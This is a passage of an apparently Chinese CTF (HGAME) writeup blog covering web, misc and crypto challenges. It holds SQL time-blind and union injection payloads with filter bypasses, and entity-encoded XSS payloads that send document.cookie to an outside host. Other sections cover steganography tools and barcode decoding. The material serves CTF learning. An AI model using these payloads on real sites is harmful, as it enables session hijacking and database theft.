&#x3D; curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar &#x3D; base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static&#x2F;logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Cosmos&#39;Blog - 后台管理&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;logout.php&quot;&gt;退出登陆&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;插入图片&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;p&gt;&lt;label&gt;图片url: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;img_url&quot; placeholder&#x3D;&quot;&quot;&gt;&lt;&#x2F;label&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;p&gt;&lt;button type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&gt;插入&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;评论管理&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;待开发..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;&quot;&gt;</span><br><span class="line">                &lt;legend&gt;文章列表&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;待开发..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;height: 50%&quot;&gt;</span><br><span class="line">            &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">                &lt;img height&#x3D;&#39;200&#39; width&#x3D;&#39;500&#39; src&#x3D;&#39;data:image&#x2F;jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static&#x2F;error.jpg&quot;)); ?&gt;&#39;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>可以按照下面payload构造：</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200126122656.png" style="zoom: 50%;"><p>解码即可得flag</p><h4 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h4><p>题目是可以sql时间盲注，后来看官方wp联合查询就行，题目过滤了空格，而且将<code>select</code>替换成空</p><p>贴一下我脚本的payload吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;/**/and/**/if(length(database())=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(i) <span class="comment">#爆当前数据库长度</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;/**/and/**/if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(j, k) <span class="comment">#爆当前数据库</span></span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;/**/and/**/if(ascii(substr((selselectect/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(k , i, j)<span class="comment">#爆所有数据库，注意limit那里是从0开始</span></span><br><span class="line"></span><br><span class="line">payload4=<span class="string">&#x27;/**/and/**/if(ascii(substr((selselectect/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(k , i, j) <span class="comment">#爆表</span></span><br><span class="line"></span><br><span class="line">payload5=<span class="string">&#x27;/**/and/**/if(ascii(substr((seselectlect/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&quot;&#123;&#125;&quot; limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(te,k,i,j) <span class="comment">#爆字段</span></span><br><span class="line"></span><br><span class="line">payload6=<span class="string">&#x27;/**/and/**/if(ascii(substring((seselectlect/**/&#123;&#125;/**/from/**/&#123;&#125;.&#123;&#125;/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(co,db,ta,k,i,j) <span class="comment">#爆内容</span></span><br></pre></td></tr></table></figure><p>联合查询的payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span>database();<span class="comment">#</span></span><br><span class="line"><span class="comment">#得到数据库为easysql</span></span><br><span class="line"></span><br><span class="line">&#x27;<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span>group_concat(table_name)<span class="comment">/*1*/</span>from<span class="comment">/*1*/</span>informat</span><br><span class="line">ion_schema.tables<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_schema=&#x27;easysql&#x27;;<span class="comment">#</span></span><br><span class="line"><span class="comment">#得到数据库中的所有表名 发现存放flag的表名为f1aggggggggggggg</span></span><br><span class="line"></span><br><span class="line">&#x27;<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span>group_concat(column_name)<span class="comment">/*1*/</span>from<span class="comment">/*1*/</span>informa</span><br><span class="line">tion_schema.columns<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_name=&#x27;f1aggggggggggggg&#x27;<span class="comment">/*1*/</span>and<span class="comment">/*1*/</span>tab</span><br><span class="line">le_schema=&#x27;easysql&#x27;;<span class="comment"># </span></span><br><span class="line"><span class="comment">#得到flag的字段名为fl4444444g</span></span><br><span class="line"></span><br><span class="line">&#x27;<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span>fl4444444g<span class="comment">/*1*/</span>from<span class="comment">/*1*/</span>f1aggggggggggggg;<span class="comment">#</span></span><br><span class="line"><span class="comment">#得到flag</span></span><br></pre></td></tr></table></figure><h4 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h4><p>这题没什莫难度，写脚本就行，不过我的脚本是真的烂，勿喷！2333….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dnc</span>(<span class="params">tr</span>):</span></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tr:</span><br><span class="line">f+=chr(ord(i)<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rec</span>(<span class="params">tr</span>):</span></span><br><span class="line"><span class="keyword">return</span> tr[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span>(<span class="params">s, OffSet=<span class="number">13</span></span>):</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">encodeCh</span>(<span class="params">ch</span>):</span></span><br><span class="line">         f=<span class="keyword">lambda</span> x: chr((ord(ch)-x+OffSet) % <span class="number">26</span> + x)</span><br><span class="line">         <span class="keyword">return</span> f(<span class="number">97</span>) <span class="keyword">if</span> ch.islower() <span class="keyword">else</span> (f(<span class="number">65</span>) <span class="keyword">if</span> ch.isupper() <span class="keyword">else</span> ch)</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64</span>(<span class="params">tr</span>):</span></span><br><span class="line"> <span class="keyword">return</span> str(base64.b64decode(tr.encode()).decode())</span><br><span class="line"> <span class="comment"># return requests.get(&quot;http://127.0.0.1/base64.php?a=&quot;+tr).text</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">met</span>(<span class="params">tr</span>):</span></span><br><span class="line">s=requests.get(<span class="string">&#x27;http://1c75f1a924.php.hgame.n3ko.co/mycode&#x27;</span>)</span><br><span class="line">li=re.findall(<span class="string">r&#x27;echo\(.*\)&#x27;</span>,s.text)[<span class="number">0</span>]</span><br><span class="line">mets=[]</span><br><span class="line">m=[<span class="string">&#x27;str_rot13&#x27;</span>,<span class="string">&#x27;base64_encode&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;strrev&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> li.split(<span class="string">&#x27;(&#x27;</span>):</span><br><span class="line"><span class="keyword">if</span> l <span class="keyword">in</span> m:</span><br><span class="line">mets.append(l)</span><br><span class="line">mets.reverse()</span><br><span class="line">de=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> mets:</span><br><span class="line"><span class="keyword">if</span> j==<span class="string">&quot;base64_encode&quot;</span>:</span><br><span class="line">de+=<span class="string">&#x27;b64(&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j==<span class="string">&quot;str_rot13&quot;</span>:</span><br><span class="line">de+=<span class="string">&quot;rot13(&quot;</span></span><br><span class="line"><span class="keyword">elif</span> j==<span class="string">&quot;strrev&quot;</span>:</span><br><span class="line">de+=<span class="string">&quot;rec(&quot;</span></span><br><span class="line"><span class="keyword">elif</span> j==<span class="string">&quot;encrypt&quot;</span>:</span><br><span class="line">de+=<span class="string">&quot;dnc(&quot;</span></span><br><span class="line">de+=<span class="string">&quot;&#x27;&quot;</span>+tr+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">de+=de.count(<span class="string">&quot;(&quot;</span>)*<span class="string">&quot;)&quot;</span></span><br><span class="line">print(de)</span><br><span class="line"><span class="keyword">return</span> eval(de)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://1c75f1a924.php.hgame.n3ko.co/&#x27;</span></span><br><span class="line">q=requests.session()</span><br><span class="line">r=q.get(url)</span><br><span class="line">r.encoding=<span class="string">&quot;utf-8&quot;</span></span><br><span class="line">tr=str(re.findall(<span class="string">r&#x27;&lt;br&gt;\n(.*)&lt;br&gt;&#x27;</span>,r.text)[<span class="number">-1</span>])</span><br><span class="line">data=&#123;<span class="string">&quot;token&quot;</span>:met(tr)&#125;</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">r=q.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h4 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h4><p>本题考察的是xss</p><p>经过测试，发现<code>script</code>标签过滤，<code>&lt;&gt;</code>有单双引号闭合会替换成空，发现<code>img</code>标签可用</p><p>最终构造出来：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#100;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#117;</span><span class="symbol">&amp;#109;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#61;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#104;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#109;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#98;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#107;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#121;</span><span class="symbol">&amp;#122;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#63;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#43;</span><span class="symbol">&amp;#100;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#117;</span><span class="symbol">&amp;#109;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#107;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#101;</span>&quot;</span>#</span></span><br></pre></td></tr></table></figure><p>实体编码代表的意思是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.location=<span class="string">&#x27;http://xss.moonback.xyz/?&#x27;</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure><p>通过日志就可看到token了，最后</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200127220928.png" style="zoom: 67%;"><p>另外一个payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x3d;</span><span class="symbol">&amp;#x6e;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x77;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x49;</span><span class="symbol">&amp;#x6d;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x67;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x2e;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x3d;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x2e;</span><span class="symbol">&amp;#x6d;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6e;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x6b;</span><span class="symbol">&amp;#x2e;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x79;</span><span class="symbol">&amp;#x7a;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x3f;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x2b;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x6d;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6e;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2e;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6b;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x3b;</span>&quot;</span></span></span><br></pre></td></tr></table></figure><p>实体编码意思</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="keyword">new</span> Image();s.src=<span class="string">&#x27;http://xss.moonback.xyz/?&#x27;</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>官方的writeup:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104</span></span></span><br><span class="line"><span class="tag">&amp;#<span class="attr">116</span>&amp;#<span class="attr">116</span>&amp;#<span class="attr">112</span>&amp;#<span class="attr">58</span>&amp;#<span class="attr">47</span>&amp;#<span class="attr">47</span>&amp;#<span class="attr">118</span>&amp;#<span class="attr">112</span>&amp;#<span class="attr">115</span>&amp;#<span class="attr">45</span>&amp;#<span class="attr">105</span>&amp;#<span class="attr">112</span>&amp;#<span class="attr">39</span>&amp;#<span class="attr">43</span>&amp;#<span class="attr">100</span>&amp;#<span class="attr">111</span>&amp;#<span class="attr">99</span>&amp;</span></span><br><span class="line"><span class="tag">#<span class="attr">117</span>&amp;#<span class="attr">109</span>&amp;#<span class="attr">101</span>&amp;#<span class="attr">110</span>&amp;#<span class="attr">116</span>&amp;#<span class="attr">46</span>&amp;#<span class="attr">99</span>&amp;#<span class="attr">111</span>&amp;#<span class="attr">111</span>&amp;#<span class="attr">107</span>&amp;#<span class="attr">105</span>&amp;#<span class="attr">101</span>&amp;#<span class="attr">41</span>&amp;#<span class="attr">59</span>&amp;#<span class="attr">47</span>&amp;#<span class="attr">47</span></span></span><br></pre></td></tr></table></figure><p>编码内的内容是 <code>window.open(&#39;http://vps-ip&#39;+document.cookie);//</code></p><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h4 id="Cosmos的午餐"><a href="#Cosmos的午餐" class="headerlink" title="Cosmos的午餐"></a>Cosmos的午餐</h4><p>打开两个文件，<code>Capture.pcapng</code>和<code>ssl_log.log</code></p><p>wireshark打开流量包，将ssl导入进去</p><p>具体操作：编辑-&gt;首选项-&gt;Protocols-&gt;TLS</p><p>成功导入，导出HTTP对象发现，有个文件特别大</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200126161310.png" style="zoom:67%;"><p>导出发现是个压缩包，解压得<code>Outguess with key.jpg</code></p><p>由这个文件名字猜测用Outguess隐写的，地址：<a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install outguess<span class="comment">#安装</span></span><br><span class="line">outguess -k password -d hinden.txt demo.jpg out.jpg<span class="comment">#加密</span></span><br><span class="line">outguess -k password -r out.jpg hidden.txt<span class="comment">#解密</span></span><br></pre></td></tr></table></figure><p>查看文件属性果然找到密码</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200126161930.png" style="zoom:50%;"><p>解密出来是个url（<a href="https://dwz.cn/69rOREdu">https://dwz.cn/69rOREdu</a>），访问出错，用curl查看</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200126171245.png" style="zoom: 67%;"><p>访问有一个压缩包，解压得一个二维码，扫码得flag</p><h4 id="所见即为假"><a href="#所见即为假" class="headerlink" title="所见即为假"></a>所见即为假</h4><p>题目是个压缩包，16进制查看，发现是zip伪加密，即标志位为<code>14 00 09 00</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200124232355.png" style="zoom: 80%;"><p>可以手动将其改为<code>14 00 00 00</code>，也可以直接用winrar恢复</p><p>成功解压后发现是一张图片，用strings查看发现最后有<code>F5 key</code></p><p>搜了一下，找到对应的工具：<a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200124233102.png" style="zoom:67%;"><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java Extract <span class="number">123456</span>.jpg -p <span class="number">123456</span> -e a.txt #隐写解密输出到a.txt,不加-e会直接输出output.txt</span><br><span class="line">java Embed -e <span class="number">1</span>.txt -p <span class="number">123456</span> <span class="number">1</span>.jpg <span class="number">2</span>.jpg #将<span class="number">1</span>.txt内容隐写到<span class="number">1</span>.jpg输出为<span class="number">2</span>.jpg，密码为<span class="number">123456</span></span><br></pre></td></tr></table></figure><p>在<code>output.txt</code>得到一串16进制字符串，转Ascii字符即可得到flag</p><h4 id="地球上最后的夜晚"><a href="#地球上最后的夜晚" class="headerlink" title="地球上最后的夜晚"></a>地球上最后的夜晚</h4><p>题目解压两个文件，<code>No password.pdf</code>和加密的<code>Last Evenings on Earth.7z</code></p><p>题目考察的是pdf隐写，工具地址：<a href="http://wbstego.wbailer.com/">http://wbstego.wbailer.com</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200126144051.png" style="zoom: 80%;"><p>直接用工具，密码设置为空，获取隐写内容得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zip Password: OmR#O12#b3b%s*IW</span><br></pre></td></tr></table></figure><p>解压压缩包，发现是<code>Last Evenings on Earth.docx</code>，binwalk分离，在<code>word/secret.xml</code>里找到flag</p><h4 id="玩玩条码"><a href="#玩玩条码" class="headerlink" title="玩玩条码"></a>玩玩条码</h4><p>⾸先解压附件，得到<code>7zipPasswordHere.mp4</code>、<code>Code128.7z</code>和<code>JPNPostCode.png</code></p><p>先看下这个<code>JPNPostCode.png</code>，通过文件名可知与日本邮政条码相关</p><p>编码规则参考资料：<a href="http://help.seagullscientifific.com/2016/en/Subsystems/Symbology/Content/Japanese_Postal.htm">http://help.seagullscientifific.com/2016/en/Subsystems/Symbology/Content/Japanese_Postal.htm</a></p><p>可看出，该条码由四种不同的样式组成（⻓条，上⽅半⻓条，下⽅半⻓条，短条，分别⽤1、2、3、4表</p><p>示）。条码由开始标志（1 3）、数字部分（每个数字由三个“条”组成）、字⺟部分（若⽆字⺟则使⽤填</p><p>充符号，填充符号为4 2 3）、校验位和结束标志组成</p><p>再结合内容为“0123456789”的条码 (在线⽣成：<a href="https://barcode.tec-it.com/zh/JapanesePostal?data=">https://barcode.tec-it.com/zh/JapanesePostal?data=</a></p><p>0123456789)：</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/barcode.gif" style="zoom: 200%;"><p>可以得到数字区域对应的条码编码规律：</p><p>0：1 4 4     1：1 1 4     2：1 3 2     3：3 1 2     4：1 2 3     5：1 4 1     6：3 2 1     7：2 1 3     8：2 3 1     9：4 1 1</p><p>随后按照这⼀规律⽐对附件中给出的条码，可以解出条码内容为<code>1087627</code>（由于字⺟区域均为填充符</p><p>号，因此可以判断出没有信息存在）</p><p>再看下<code>7zipPasswordHere.mp4</code>，题目给了两个链接：</p><p>【参考资料1】：<a href="http://virtualdub2.com/">http://virtualdub2.com/</a><br>【参考资料2】：<a href="https://sourceforge.net/projects/virtualdubffmpeginputplugin/">https://sourceforge.net/projects/virtualdubffmpeginputplugin/</a></p><p>结合题⽬给出的参考资料，可以发现对视频进⾏处理需要⽤到VirtualDub2。结合百度搜索，猜想视频经过MSU StegoVideo隐写，MSU StegoVideo链接：<a href="http://www.compression.ru/video/stego_video/index_en.html">http://www.compression.ru/video/stego_video/index_en.html</a></p><p>安装软件，并将插件全部解压⾄plugin32⽂件夹。随后运⾏32位版本VirtualDub2，载⼊插件。Video -&gt; Filters -&gt; Add -&gt; MSU StegoVideo 1.0 -&gt; OK：</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200203164547.png" style="zoom:80%;"><p>弹出MSU StegoVideo插件界⾯。选择 Extract fifile from video，并填好密码和分离出的⽂件的路径</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200203165755.png" style="zoom:80%;"><p>然后打开视频文件，接着Go-&gt; Preview fifiltered</p><p>播放一会发现，文件里写入了</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200203170116.png" style="zoom:80%;"><p>解压得到<code>Code128.png</code>，在线解密地址：<a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200203171150.png" style="zoom: 80%;"><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="Verification-code"><a href="#Verification-code" class="headerlink" title="Verification_code"></a>Verification_code</h4><p>有源码，就是一个暴力破解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 